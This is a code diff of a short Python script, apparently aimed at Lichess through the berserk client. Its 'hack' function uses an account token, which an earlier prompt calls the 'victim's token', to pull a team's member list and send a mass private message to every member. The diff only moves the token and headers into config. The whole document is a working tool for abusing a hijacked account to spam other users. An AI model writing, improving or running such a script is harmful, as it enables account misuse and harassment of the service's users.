@@ -5,10 +5,8 @@ import requests
 from config import *
 
 
-def hack(token, team):
-    heads = {'Authorization': f'Bearer {token}'}
-
-    session = berserk.TokenSession(token)
+def hack(team):
+    session = berserk.TokenSession(TOKEN)
     client = berserk.Client(session=session)
 
     r = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
@@ -16,7 +14,7 @@ def hack(token, team):
 
     print(green + "[+] Список пользователей получен!")
 
-    session.post(f'https://{SERVER}/{TEAM}/' + team + f'/{PM_ALL}', data={'message': msg}, headers=heads).json()
+    session.post(f'https://{SERVER}/{TEAM}/' + team + f'/{PM_ALL}', data={'message': msg}, headers=HEADS).json()
     print("[+] Рассылка успешна отправлена!")
 
     for i in data:
@@ -26,4 +24,4 @@ def hack(token, team):
 
 
 if __name__ == "__main__":
-    hack(token=input(magenta + "[?] Введите токен жертвы: "), team=input(magenta + "[?] ID команды: "))
+    hack(team=input(magenta + "[?] ID команды: "))
